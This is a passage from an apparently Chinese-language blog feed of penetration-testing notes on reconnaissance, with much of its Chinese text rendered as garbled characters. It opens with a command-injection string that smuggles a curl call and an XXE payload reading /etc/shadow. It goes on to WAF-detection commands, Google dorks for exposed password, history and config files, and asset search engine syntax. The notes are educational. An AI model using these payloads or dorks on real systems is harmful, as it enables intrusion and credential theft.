127.0.0.1; curl google.com'</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xxestring <span class="token operator">=</span> '<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">ENTITY</span> xxe <span class="token constant">SYSTEM</span> <span class="token string">"file:///etc/shadow"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>pwn<span class="token operator">></span><span class="token operator">&amp;</span>hack<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>pwn<span class="token operator">></span>"</code></pre><h6 id="WAFËØÜÂà´Â∑•ÂÖ∑"><a href="#WAFËØÜÂà´Â∑•ÂÖ∑" class="headerlink" title="WAFËØÜÂà´Â∑•ÂÖ∑"></a>WAFËØÜÂà´Â∑•ÂÖ∑</h6><p>KaliËá™Â∏¶Ôºö</p><ul><li><p><a href="https://github.com/EnableSecurity/wafwOOf">wafwOOf</a> </p></li><li><p>wafw00f <a href="https://www.12306.cn/">https://www.12306.cn</a></p></li><li><p>nmap <a href="http://www.12306.cn/">www.12306.cn</a> ‚Äìscript&#x3D;http-waf-detect.nse</p></li><li><p>sqlmap -u ‚Äúxxx.com?id&#x3D;1‚Äù ‚Äìidentify-waf</p></li></ul><p>ÂÖ∂‰ªñÔºö</p><ul><li><a href="https://github.com/Oxlnfection/Awesome-WAF">Build software better, together</a></li></ul><h5 id="ÊêúÁ¥¢ÂºïÊìé-GoogleËØ≠Ê≥ï"><a href="#ÊêúÁ¥¢ÂºïÊìé-GoogleËØ≠Ê≥ï" class="headerlink" title="ÊêúÁ¥¢ÂºïÊìé(GoogleËØ≠Ê≥ï)"></a>ÊêúÁ¥¢ÂºïÊìé(GoogleËØ≠Ê≥ï)</h5><p>Êü•ÊâæÊ≠£ÊñáÂê´ÊúâÂÖ≥ÈîÆÂ≠óÁöÑÁΩëÈ°µ</p><h6 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">intext</span><span class="token punctuation">:</span>ÂêéÂè∞ÁôªÈôÜ      Âè™ËøîÂõûÊ≠£ÊñáÂåÖÂê´‚ÄúÂêéÂè∞ÁôªÈôÜ‚ÄùÁöÑÁΩëÈ°µ</code></pre><h6 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">intitle</span><span class="token punctuation">:</span>ÂêéÂè∞ÁôªÈôÜ           Âè™ËøîÂõûÊ†áÈ¢ò‰∏≠ÂåÖÂê´‚ÄúÂêéÂè∞ÁôªÂΩï‚ÄùÁöÑÁΩëÈ°µ</code></pre><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">allintitle</span><span class="token punctuation">:</span>ÂêéÂè∞ÁôªÈôÜ ÁÆ°ÁêÜÂëò       ÂèØ‰ª•ÊåáÂÆöÂ§ö‰∏™ËØç</code></pre><h6 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">inurl</span><span class="token punctuation">:</span>login</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">inurl</span><span class="token operator">:</span><span class="token operator">/</span>admin<span class="token operator">/</span>login<span class="token punctuation">.</span>php      Êü•ÊâæÁÆ°ÁêÜÂëòÁôªÈôÜÈ°µÈù¢<span class="token literal-property property">inurl</span><span class="token operator">:</span><span class="token operator">/</span>phpmyadmin<span class="token operator">/</span>index<span class="token punctuation">.</span>php  Êü•ÊâæÂêéÂè∞Êï∞ÊçÆÂ∫ìÁÆ°ÁêÜÂëòÈ°µÈù¢<span class="token literal-property property">allinurl</span><span class="token operator">:</span>                  ÂèØ‰ª•ÊåáÂÆöÂ§ö‰∏™ËØç</code></pre><h6 id="site"><a href="#site" class="headerlink" title="site"></a>site</h6><pre class="language-mipsasm" data-language="mipsasm"><code class="language-mipsasm">site:baidu.com inurl:login         Âè™Âú®baidu.com ‰∏≠Êü•Êâæurl‰∏≠Âê´Êúâ LoginÁöÑÁΩëÈ°µ</code></pre><h6 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h6><p>ÊåáÂÆöËÆøÈóÆÁöÑÊñá‰ª∂Á±ªÂûã</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">site</span><span class="token punctuation">:</span>xcu.edu.cn filetype<span class="token punctuation">:</span>pdf</code></pre><h6 id="link"><a href="#link" class="headerlink" title="link"></a>link</h6><p>ÊåáÂÆöËøûÊé•ÁöÑÁΩëÈ°µ</p><pre class="language-bash" data-language="bash"><code class="language-bash">link:www.baidu.com </code></pre><h6 id="related"><a href="#related" class="headerlink" title="related"></a>related</h6><p>Áõ∏‰ººÁ±ªÂûãÁöÑÁΩëÈ°µ</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">related</span><span class="token punctuation">:</span>www.xcu.edu.cn</code></pre><h6 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h6><p>ËøîÂõûÊµèËßàÂô®ÂØπÁΩëÁ´ôÁöÑÁºìÂ≠ò</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">cache</span><span class="token punctuation">:</span>www.xcu.edu.cn</code></pre><h6 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h6><p>ËøîÂõûÁ´ôÁÇπÁöÑÊåáÂÆö‰ø°ÊÅØ</p><h6 id="define"><a href="#define" class="headerlink" title="define:"></a>define:</h6><p>ËøîÂõûÊüê‰∏™ËØçËØ≠ÁöÑÂÆö‰πâ</p><h6 id="phonebook"><a href="#phonebook" class="headerlink" title="phonebook:"></a>phonebook:</h6><p>ÁîµËØùÁ∞øÊü•ËØ¢ÁæéÂõΩË°óÈÅìÂú∞ÂùÄÂíåÁîµËØùÂè∑Á†Å‰ø°ÊÅØ</p><h6 id="Êü•ÊâæÁΩëÁ´ôÂêéÂè∞"><a href="#Êü•ÊâæÁΩëÁ´ôÂêéÂè∞" class="headerlink" title="Êü•ÊâæÁΩëÁ´ôÂêéÂè∞"></a>Êü•ÊâæÁΩëÁ´ôÂêéÂè∞</h6><ul><li>site:xx.com intext:ÁÆ°ÁêÜ</li><li>site:xx.com inurl:login</li><li>site:xx.com intitle:ÂêéÂè∞</li></ul><h6 id="Êü•ÁúãÊúçÂä°Âô®‰ΩøÁî®ÁöÑÁ®ãÂ∫è"><a href="#Êü•ÁúãÊúçÂä°Âô®‰ΩøÁî®ÁöÑÁ®ãÂ∫è" class="headerlink" title="Êü•ÁúãÊúçÂä°Âô®‰ΩøÁî®ÁöÑÁ®ãÂ∫è"></a>Êü•ÁúãÊúçÂä°Âô®‰ΩøÁî®ÁöÑÁ®ãÂ∫è</h6><ul><li>site:xx.com filetype:asp</li><li>site:xx.com filetype:php</li><li>site:xx.com filetype:jsp</li><li>site:xx.com filetype:aspx</li></ul><h6 id="Êü•Áúã‰∏ä‰º†ÊºèÊ¥û"><a href="#Êü•Áúã‰∏ä‰º†ÊºèÊ¥û" class="headerlink" title="Êü•Áúã‰∏ä‰º†ÊºèÊ¥û"></a>Êü•Áúã‰∏ä‰º†ÊºèÊ¥û</h6><ul><li>site:xx.com inurl:file</li><li>site:xx.com inurl:load</li></ul><h6 id="index-of"><a href="#index-of" class="headerlink" title="index of"></a>index of</h6><p>Âà©Áî® Index of ËØ≠Ê≥ïÂéªÂèëÁé∞ÂÖÅËÆ∏ÁõÆÂΩïÊµèËßàÁöÑwebÁΩëÁ´ôÔºåÂ∞±ÂÉèÂú®Êú¨Âú∞ÁöÑÊôÆÈÄöÁõÆÂΩï‰∏ÄÊ†∑</p><pre class="language-bash" data-language="bash"><code class="language-bash">index of /adminindex of /passwdindex of /passwordindex of /mail<span class="token string">"index of /"</span> +passwd<span class="token string">"index of /"</span> +password.txt<span class="token string">"index of /"</span>.htaccess<span class="token string">"index of /root"</span><span class="token string">"index of/cgi-bin"</span><span class="token string">"index of/logs"</span><span class="token string">"index of /config"</span></code></pre><p>inurl</p><p>ËÄå‰∏äÈù¢Ëøô‰∫õÂëΩ‰ª§‰∏≠Áî®ÁöÑÊúÄÂ§öÁöÑÂ∞±ÊòØ inurl: ‰∫ÜÔºåÂà©Áî®Ëøô‰∏™ÂëΩ‰ª§ÔºåÂèØ‰ª•Êü•Âà∞ÂæàÂ§öÊÑèÊÉ≥‰∏çÂà∞ÁöÑ‰∏úË•ø</p><pre class="language-bash" data-language="bash"><code class="language-bash">Âà©Áî® allinurl:winnt/system32/ Êü•ËØ¢ÔºöÂàóÂá∫ÁöÑÊúçÂä°Âô®‰∏äÊú¨Êù•Â∫îËØ•ÂèóÈôêÂà∂ÁöÑËØ∏Â¶Ç‚Äúsystem32‚Äù Á≠âÁõÆÂΩïÔºåÂ¶ÇÊûú‰Ω†ËøêÊ∞îË∂≥Â§üÂ•ΩÔºå‰Ω†‰ºöÂèëÁé∞‚Äúsystem32‚Äù ÁõÆÂΩïÈáåÁöÑ‚Äúcmd.exe‚Äù Êñá‰ª∂ÔºåÂπ∂ËÉΩÊâßË°å‰ªñÔºåÊé•‰∏ãÊù•Â∞±ÊòØÊèêÂçáÊùÉÈôêÂπ∂ÊîªÂÖã‰∫Ü„ÄÇÊü•ËØ¢ allinurl:wwwboard/passwd.txt  Â∞ÜÂàóÂá∫ÊâÄÊúâÊúâ‚ÄúWWWBoard Password vulnerability‚ÄùÊºèÊ¥ûÁöÑÊúçÂä°Âô®Êü•ËØ¢  inurl:.bash_history  Â∞ÜÂàóÂá∫‰∫íËÅîÁΩë‰∏äÂèØ‰ª•ÁúãËßÅ ‚Äúinurl:.bash_history‚Äù Êñá‰ª∂ÁöÑÊúçÂä°Âô®„ÄÇËøôÊòØ‰∏Ä‰∏™ÂëΩ‰ª§ÂéÜÂè≤Êñá‰ª∂ÔºåËøô‰∏™Êñá‰ª∂ÂåÖÂê´‰∫ÜÁÆ°ÁêÜÂëòÊâßË°åÁöÑÂëΩ‰ª§ÔºåÊúâÊó∂‰ºöÂåÖÂê´‰∏Ä‰∫õÊïèÊÑü‰ø°ÊÅØÊØîÂ¶ÇÁÆ°ÁêÜÂëòÈîÆÂÖ•ÁöÑÂØÜÁ†Å„ÄÇÊü•ËØ¢ inurl:config.txt  Â∞ÜÁúãËßÅÁΩë‰∏äÊö¥Èú≤‰∫Ü‚Äúinurl:config.txt‚ÄùÊñá‰ª∂ÁöÑÊúçÂä°Âô®ÔºåËøô‰∏™Êñá‰ª∂ÂåÖÂê´‰∫ÜÁªèËøáÂìàÂ∏åÁºñÁ†ÅÁöÑÁÆ°ÁêÜÂëòÁöÑÂØÜÁ†ÅÂíåÊï∞ÊçÆÂ∫ìÂ≠òÂèñÁöÑÂÖ≥ÈîÆ‰ø°ÊÅØ„ÄÇ</code></pre><p>ËøòÊúâ‰∏Ä‰∫õÂÖ∂‰ªñ‰∏Ä‰∫õ‰ΩøÁî®‚Äúinurl:‚ÄùÂíå‚Äúallinurl:‚ÄùÊü•ËØ¢ÁªÑÂêàÁöÑ‰æãÂ≠ê</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>db<span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>cfg<span class="token target symbol">inurl</span><span class="token punctuation">:</span>mysql filetype<span class="token punctuation">:</span>cfg<span class="token target symbol">inurl</span><span class="token punctuation">:</span>passwd filetype<span class="token punctuation">:</span>txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>‚Äùwwwroot/*.‚Äù<span class="token target symbol">inurl</span><span class="token punctuation">:</span>adpassword.txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>webeditor.php<span class="token target symbol">inurl</span><span class="token punctuation">:</span>file_upload.php<span class="token target symbol">inurl</span><span class="token punctuation">:</span>gov filetype<span class="token punctuation">:</span>xls ‚Äúrestricted‚Äù<span class="token target symbol">index of ftp +.mdb allinurl</span><span class="token punctuation">:</span>/cgi-bin/ +mailto</code></pre><h6 id="ËØ≠Ê≥ïÊï∞ÊçÆÂ∫ì-Â∑•ÂÖ∑"><a href="#ËØ≠Ê≥ïÊï∞ÊçÆÂ∫ì-Â∑•ÂÖ∑" class="headerlink" title="ËØ≠Ê≥ïÊï∞ÊçÆÂ∫ì&amp;Â∑•ÂÖ∑"></a>ËØ≠Ê≥ïÊï∞ÊçÆÂ∫ì&amp;Â∑•ÂÖ∑</h6><p><a href="https://www.exploit-db.com/googlehacking-database">Google Hacking Database</a></p><p>[Google Dork List](<a href="https://github.com/BullsEye0/google_dork">https://github.com/BullsEye0/google_dork</a>_<br>list)</p><p><a href="https://github.com/opsdisk/pagodo">pagodo - Passive Google Dork</a></p><h5 id="ÁΩëÁªúÁ©∫Èó¥ÊêúÁ¥¢ÂºïÊìé"><a href="#ÁΩëÁªúÁ©∫Èó¥ÊêúÁ¥¢ÂºïÊìé" class="headerlink" title="ÁΩëÁªúÁ©∫Èó¥ÊêúÁ¥¢ÂºïÊìé"></a>ÁΩëÁªúÁ©∫Èó¥ÊêúÁ¥¢ÂºïÊìé</h5><h6 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><a href="https://www.shodan.io/">shodan</a></h6><p>shodanÁΩëÁªúÊêúÁ¥¢ÂºïÊìéÂÅèÂêëÁΩëÁªúËÆæÂ§á‰ª•ÂèäÊúçÂä°Âô®ÁöÑÊêúÁ¥¢</p><p>ÁΩëÁªúÁ±ª</p><pre class="language-bash" data-language="bash"><code class="language-bash">port          Á´ØÂè£  product     ÊâÄ‰ΩøÁî®ÁöÑËΩØ‰ª∂Êàñ‰∫ßÂìÅos          Êìç‰ΩúÁ≥ªÁªüÁ±ªÂûãversionÔºö    ÊêúÁ¥¢ÊåáÂÆöÁöÑËΩØ‰ª∂ÁâàÊú¨Ôºå‰æãÂ¶Ç version:<span class="token string">"1.3.2"</span>netÔºöÊêúÁ¥¢ÊåáÂÆöÁöÑIPÂú∞ÂùÄÊàñÂ≠êÁΩëÔºå‰æãÂ¶Ç net:<span class="token string">"110.43.140.0/24"</span></code></pre><p>Â∫îÁî®Á±ª</p><pre class="language-bash" data-language="bash"><code class="language-bash">html.title  ÁΩëÈ°µÊ†áÈ¢òhttp.html   ÁΩëÈ°µÂÜÖÂÆπhttp.server httpËØ∑Ê±ÇËøîÂõû‰∏≠serverÁöÑÁ±ªÂûãhttp.status httpËØ∑Ê±ÇËøîÂõûÂìçÂ∫îÁ†ÅÁöÑÁä∂ÊÄÅ<span class="token function">hostname</span>  ‰∏ªÊú∫Á±ªÂûãhttp.favicon.hash iconÂØπÂ∫îhashvuln       CVEÊºèÊ¥ûÁºñÂè∑Ôºå‰æãÂ¶ÇÔºövulnÔºöCVE-2014-0723</code></pre><p>Âú∞ÁêÜ‰ΩçÁΩÆÁ±ª</p><pre class="language-bash" data-language="bash"><code class="language-bash">countryÔºöÊêúÁ¥¢ÊåáÂÆöÁöÑÂõΩÂÆ∂Ôºå‰æãÂ¶Ç country:<span class="token string">"CN"</span>cityÔºöÊêúÁ¥¢ÊåáÂÆöÁöÑÂüéÂ∏ÇÔºå‰æãÂ¶Ç city:<span class="token string">"Beijing"</span>orgÔºöÊêúÁ¥¢ÊåáÂÆöÁöÑÁªÑÁªáÊàñÂÖ¨Âè∏Ôºå‰æãÂ¶Ç org:<span class="token string">"google"</span>ispÔºöÊêúÁ¥¢ÊåáÂÆöÁöÑISP‰æõÂ∫îÂïÜÔºå‰æãÂ¶Ç isp:<span class="token string">"China Telecom"</span></code></pre><p>ÂÖ∂‰ªñ<br>Â¶ÇÊûúÈúÄË¶ÅÂ§ö‰∏™ËØçÂêåÊó∂ÊêúÁ¥¢Êó∂ÔºåÂè™ÈúÄË¶ÅÂú®ÊØè‰∏™ÂÖ≥ÈîÆÂ≠óÈó¥Âä†Á©∫Ê†ºÂàÜÂâ≤Â∞±Ë°åÔºåÊØîÂ¶ÇÔºöcountry:‚ÄúCN‚Äù city:‚ÄúBeijing‚Äù<br>ÂΩì‰∏çÈúÄË¶ÅÊüê‰∏™ËØçÊó∂ÔºåÂèØ‰ª•Áî®‚Äù-‚ÄùÂä†‰∏äÂÖ≥ÈîÆËØçÊù•ËøõË°åÂéªÈô§„ÄÇÊØîÂ¶ÇÔºö‚Äù-port:80‚ÄùÔºàÊéíÈô§80Á´ØÂè£ÊêúÁ¥¢ÁªìÊûúÔºâ<br><a href="https://github.com/random-robbie/My-Shodan-Scripts">My-Shodan-Scripts</a></p><h6 id="censys"><a href="#censys" class="headerlink" title="censys"></a><a href="https://search.censys.io/">censys</a></h6><ul><li>23.0.0.0&#x2F;8 or 8.8.8.0&#x2F;24„ÄÄ„ÄÄÂèØ‰ª•‰ΩøÁî®and or not</li><li>80.http.get.status_code: 200„ÄÄ„ÄÄÊåáÂÆöÁä∂ÊÄÅ</li><li>80.http.get.status_code:[200 TO 300]„ÄÄ„ÄÄ200-300‰πãÈó¥ÁöÑÁä∂ÊÄÅÁ†Å</li><li>location.country_code: DE„ÄÄ„ÄÄÂõΩÂÆ∂</li><li>protocols: (‚Äú23&#x2F;telnet‚Äù or ‚Äú21&#x2F;ftp‚Äù)„ÄÄ„ÄÄÂçèËÆÆ</li><li>tags: scada„ÄÄ„ÄÄÊ†áÁ≠æ</li><li>80.http.get.headers.serverÔºönginx„ÄÄ„ÄÄÊúçÂä°Âô®Á±ªÂûãÁâàÊú¨</li><li>autonomous_system.description: University„ÄÄ„ÄÄÁ≥ªÁªüÊèèËø∞</li><li>Ê≠£Âàô</li></ul><h6 id="ÈíüÈ¶ó‰πãÁúºZoomEye"><a href="#ÈíüÈ¶ó‰πãÁúºZoomEye" class="headerlink" title="ÈíüÈ¶ó‰πãÁúºZoomEye"></a><a href="https://www.zoomeye.org/">ÈíüÈ¶ó‰πãÁúºZoomEye</a></h6><p>ÈíüÈ¶ó‰πãÁúºÊêúÁ¥¢ÂºïÊìéÂÅèÂêëwebÂ∫îÁî®Â±ÇÈù¢ÁöÑÊêúÁ¥¢„ÄÇ</p><ul><li>app:nginx„ÄÄ„ÄÄÁªÑ‰ª∂Âêç</li><li>ver:1.0„ÄÄ„ÄÄÁâàÊú¨</li><li>os:windows„ÄÄ„ÄÄÊìç‰ΩúÁ≥ªÁªü</li><li>country:‚ÄùChina‚Äù„ÄÄ„ÄÄÂõΩÂÆ∂</li><li>city:‚Äùhangzhou‚Äù„ÄÄ„ÄÄÂüéÂ∏Ç</li><li>port:80„ÄÄ„ÄÄÁ´ØÂè£</li><li>hostname:google„ÄÄ„ÄÄ‰∏ªÊú∫Âêç</li><li>site:thief.one„ÄÄ„ÄÄÁΩëÁ´ôÂüüÂêç</li><li>desc:nmask„ÄÄ„ÄÄÊèèËø∞</li><li>keywords:nmask‚Äôblog„ÄÄ„ÄÄÂÖ≥ÈîÆËØç</li><li>service:ftp„ÄÄ„ÄÄÊúçÂä°Á±ªÂûã</li><li>ip:8.8.8.8„ÄÄ„ÄÄipÂú∞ÂùÄ</li><li>cidr:8.8.8.8&#x2F;24„ÄÄ„ÄÄipÂú∞ÂùÄÊÆµ</li></ul><h6 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a><a href="https://fofa.info/">FoFa</a></h6><p>FoFaÊêúÁ¥¢ÂºïÊìéÂÅèÂêëËµÑ‰∫ßÊêúÁ¥¢„ÄÇ</p><p>ÊêúÁ¥¢ËØ≠Ê≥ï</p><ul><li>title&#x3D;‚Äùabc‚Äù ‰ªéÊ†áÈ¢ò‰∏≠ÊêúÁ¥¢abc„ÄÇ‰æãÔºöÊ†áÈ¢ò‰∏≠ÊúâÂåó‰∫¨ÁöÑÁΩëÁ´ô„ÄÇ</li><li>header&#x3D;‚Äùabc‚Äù ‰ªéhttpÂ§¥‰∏≠ÊêúÁ¥¢abc„ÄÇ‰æãÔºöjbossÊúçÂä°Âô®„ÄÇ</li><li>body&#x3D;‚Äùabc‚Äù ‰ªéhtmlÊ≠£Êñá‰∏≠ÊêúÁ¥¢abc„ÄÇ‰æãÔºöÊ≠£ÊñáÂåÖÂê´Hacked by„ÄÇ</li><li>domain&#x3D;‚Äùqq.com‚Äù ÊêúÁ¥¢Ê†πÂüüÂêçÂ∏¶Êúâqq.comÁöÑÁΩëÁ´ô„ÄÇ‰æãÔºö Ê†πÂüüÂêçÊòØqq.comÁöÑÁΩëÁ´ô„ÄÇ</li><li>host&#x3D;‚Äù.gov.cn‚Äù ‰ªéurl‰∏≠ÊêúÁ¥¢.gov.cn,Ê≥®ÊÑèÊêúÁ¥¢Ë¶ÅÁî®host‰Ωú‰∏∫ÂêçÁß∞„ÄÇ</li><li>port&#x3D;‚Äù443‚Äù Êü•ÊâæÂØπÂ∫î443Á´ØÂè£ÁöÑËµÑ‰∫ß„ÄÇ‰æãÔºö Êü•ÊâæÂØπÂ∫î443Á´ØÂè£ÁöÑËµÑ‰∫ß„ÄÇ</li><li>ip&#x3D;‚Äù1.1.1.1‚Äù ‰ªéip‰∏≠ÊêúÁ¥¢ÂåÖÂê´1.1.1.1ÁöÑÁΩëÁ´ô,Ê≥®ÊÑèÊêúÁ¥¢Ë¶ÅÁî®ip‰Ωú‰∏∫ÂêçÁß∞„ÄÇ</li><li>protocol&#x3D;‚Äùhttps‚Äù ÊêúÁ¥¢Âà∂ÂÆöÂçèËÆÆÁ±ªÂûã(Âú®ÂºÄÂêØÁ´ØÂè£Êâ´ÊèèÁöÑÊÉÖÂÜµ‰∏ãÊúâÊïà)„ÄÇ‰æãÔºö Êü•ËØ¢httpsÂçèËÆÆËµÑ‰∫ß„ÄÇ</li><li>city&#x3D;‚ÄùBeijing‚Äù ÊêúÁ¥¢ÊåáÂÆöÂüéÂ∏ÇÁöÑËµÑ‰∫ß„ÄÇ‰æãÔºö ÊêúÁ¥¢ÊåáÂÆöÂüéÂ∏ÇÁöÑËµÑ‰∫ß„ÄÇ</li><li>region&#x3D;‚ÄùZhejiang‚Äù ÊêúÁ¥¢ÊåáÂÆöË°åÊîøÂå∫ÁöÑËµÑ‰∫ß„ÄÇ‰æãÔºö ÊêúÁ¥¢ÊåáÂÆöË°åÊîøÂå∫ÁöÑËµÑ‰∫ß„ÄÇ</li><li>country&#x3D;‚ÄùCN‚Äù ÊêúÁ¥¢ÊåáÂÆöÂõΩÂÆ∂(ÁºñÁ†Å)ÁöÑËµÑ‰∫ß„ÄÇ‰æãÔºö ÊêúÁ¥¢ÊåáÂÆöÂõΩÂÆ∂(ÁºñÁ†Å)ÁöÑËµÑ‰∫ß„ÄÇ</li><li>cert&#x3D;‚Äùgoogle.com‚Äù ÊêúÁ¥¢ËØÅ‰π¶(httpsÊàñËÄÖimapsÁ≠â)‰∏≠Â∏¶Êúâgoogle.comÁöÑËµÑ‰∫ß„ÄÇ</li></ul><p>È´òÁ∫ßÊêúÁ¥¢Ôºö</p><ul><li>title&#x3D;‚Äùpowered by‚Äù &amp;&amp; title!&#x3D;discuz</li><li>title!&#x3D;‚Äùpowered by‚Äù &amp;&amp; body&#x3D;discuz</li><li>( body&#x3D;‚Äùcontent&#x3D;\‚ÄùWordPress‚Äù || (header&#x3D;‚ÄùX-Pingback‚Äù &amp;&amp; header&#x3D;‚Äù&#x2F;xmlrpc.php‚Äù &amp;&amp; body&#x3D;‚Äù&#x2F;wp-includes&#x2F;‚Äú) ) &amp;&amp; host&#x3D;‚Äùgov.cn‚Äù</li></ul><h6 id="DnsdbÊêúÁ¥¢ÂºïÊìé"><a href="#DnsdbÊêúÁ¥¢ÂºïÊìé" class="headerlink" title="DnsdbÊêúÁ¥¢ÂºïÊìé"></a><a href="https://www.dnsdb.io/">DnsdbÊêúÁ¥¢ÂºïÊìé</a></h6><p>dnsdbÊêúÁ¥¢ÂºïÊìéÊòØ‰∏ÄÊ¨æÈíàÂØπdbsËß£ÊûêÁöÑÊü•ËØ¢Âπ≥Âè∞„ÄÇ</p><p>ÊêúÁ¥¢ËØ≠Ê≥ï</p><p>DnsDBÊü•ËØ¢ËØ≠Ê≥ïÁªìÊûÑ‰∏∫Êù°‰ª∂1 Êù°‰ª∂2 Êù°‰ª∂3 ‚Ä¶., ÊØè‰∏™Êù°‰ª∂‰ª•Á©∫Ê†ºÈó¥Èöî, DnsDB ‰ºöÊääÊª°Ë∂≥ÊâÄÊúâÊü•ËØ¢Êù°‰ª∂ÁöÑÁªìÊûúËøîÂõûÁªôÁî®Êà∑.</p><p>ÂüüÂêçÊü•ËØ¢Êù°‰ª∂</p><p>ÂüüÂêçÊü•ËØ¢ÊòØÊåáÊü•ËØ¢È°∂Á∫ßÁßÅÊúâÂüüÂêçÊâÄÊúâÁöÑDNSËÆ∞ÂΩï, Êü•ËØ¢ËØ≠Ê≥ï‰∏∫domain:.<br>‰æãÂ¶ÇÊü•ËØ¢google.com ÁöÑÊâÄÊúâDNSËÆ∞ÂΩï: domain:google.com.<br>ÂüüÂêçÊü•ËØ¢ÂèØ‰ª•ÁúÅÁï•domain:.</p><p>‰∏ªÊú∫Êü•ËØ¢Êù°‰ª∂</p><p>Êü•ËØ¢ËØ≠Ê≥ï:host:<br>‰æãÂ¶ÇÊü•ËØ¢‰∏ªÊú∫Âú∞ÂùÄ‰∏∫mp3.example.comÁöÑDNSËÆ∞ÂΩï: host:map3.example.com<br>‰∏ªÊú∫Êü•ËØ¢Êù°‰ª∂‰∏éÂüüÂêçÊü•ËØ¢Êü•ËØ¢Êù°‰ª∂ÁöÑÂå∫Âà´Âú®‰∫é, ‰∏ªÊú∫Êü•ËØ¢ÂåπÈÖçÁöÑÊòØDNSËÆ∞ÂΩïÁöÑHostÂÄº</p><p>ÊåâDNSËÆ∞ÂΩïÁ±ªÂûãÊü•ËØ¢</p><p>Êü•ËØ¢ËØ≠Ê≥ï: type:.<br>‰æãÂ¶ÇÂè™Êü•ËØ¢AËÆ∞ÂΩï: type:a<br>‰ΩøÁî®Êù°‰ª∂:ÂøÖÈ°ªÂ≠òÂú®domain:ÊàñËÄÖhost:Êù°‰ª∂,ÊâçÂèØ‰ª•‰ΩøÁî®type:Êü•ËØ¢ËØ≠Ê≥ï</p><p>ÊåâIPÈôêÂà∂</p><p>Êü•ËØ¢ËØ≠Ê≥ï: ip:<br>Êü•ËØ¢ÊåáÂÆöIP: ip:8.8.8.8, ËØ•Êü•ËØ¢‰∏éÁõ¥Êé•ËæìÂÖ•8.8.8.8ËøõË°åÊü•ËØ¢Á≠âÊïà<br>Êü•ËØ¢ÊåáÂÆöIPËåÉÂõ¥: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0&#x2F;24<br>IPÊúÄÂ§ßËåÉÂõ¥ÈôêÂà∂65536‰∏™</p><p>Êù°‰ª∂ÁªÑÂêàÊü•ËØ¢ÁöÑ‰æãÂ≠ê</p><p>Êü•ËØ¢google.comÁöÑÊâÄÊúâAËÆ∞ÂΩï: google.com type:a</p><h6 id="Apollo"><a href="#Apollo" class="headerlink" title="Apollo"></a><a href="https://github.com/b0bac/ApolloScanner">Apollo</a></h6><h6 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a><a href="https://github.com/EdgeSecurityTeam/EHole">EHole</a></h6><h6 id="ShuiZe"><a href="#ShuiZe" class="headerlink" title="ShuiZe"></a><a href="https://github.com/0x727/ShuiZe_0x727">ShuiZe</a></h6><h6 id="Kunyu"><a href="#Kunyu" class="headerlink" title="Kunyu"></a><a href="https://github.com/knownsec/Kunyu">Kunyu</a></h6><h6 id="Saucerframe"><a href="#Saucerframe" class="headerlink" title="Saucerframe"></a><a href="https://github.com/saucer-man/saucerframe">Saucerframe</a></h6>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> Ê∏óÈÄèÊµãËØï </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ê∏óÈÄèÊµãËØï </tag>
            
            <tag> ‰ø°ÊÅØÊî∂ÈõÜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-sqli</title>
      <link href="/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/"/>
      <url>/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/</url>
      
